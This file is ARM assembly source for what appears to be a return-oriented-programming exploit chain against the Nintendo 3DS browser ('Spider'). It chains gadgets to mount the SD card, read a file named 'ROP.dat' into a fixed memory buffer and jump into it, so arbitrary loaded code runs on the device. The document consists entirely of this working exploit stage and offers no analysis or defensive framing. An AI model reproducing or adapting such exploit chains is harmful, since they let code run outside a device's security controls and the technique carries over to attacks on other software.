	.arm
	.text

#include "spider_rop.h"

#define BUFFER_LOC 0x08F01000
#define BUFFER_SIZE 0x00004000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	@ mount SD
		.word POP_R0_PC, DMC
		.word FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC, GARBAGE, GARBAGE, GARBAGE
	@ open file
		.word POP_R0_1_2_3_4_7_PC, THIS, SPIDER_ROP_LOC+FileName, FILE_READ, GARBAGE, GARBAGE, GARBAGE
		.word IFile_Open_LDMFD_SP_R4_5_6_7_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE
		.word POP_PC
	@ read payload
		.word POP_R0_1_2_3_4_7_PC, THIS, THIS+0x20, BUFFER_LOC, BUFFER_SIZE, GARBAGE, GARBAGE
		.word IFile_Read_LDMFD_SP_R4_5_6_7_8_9_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
		.word POP_PC
		.word POP_PC
	@ jump to payload
		.word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC
		.word LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, BUFFER_LOC-4
		.word SP_LR_LDMFD_SP_LR_PC

	.fill 10, 4, GARBAGE
	.word SPIDER_ROP_LOC+_start+0x8C
	.fill 12, 4, GARBAGE
	.word SPIDER_ROP_LOC+_start, GARBAGE, POP_PC
	.fill 9, 4, GARBAGE
	.word POP_PC, POP_PC
FileName:
	.string16 "dmc:/ROP.dat"
	.fill 81, 2, 0
	.word MAGIC
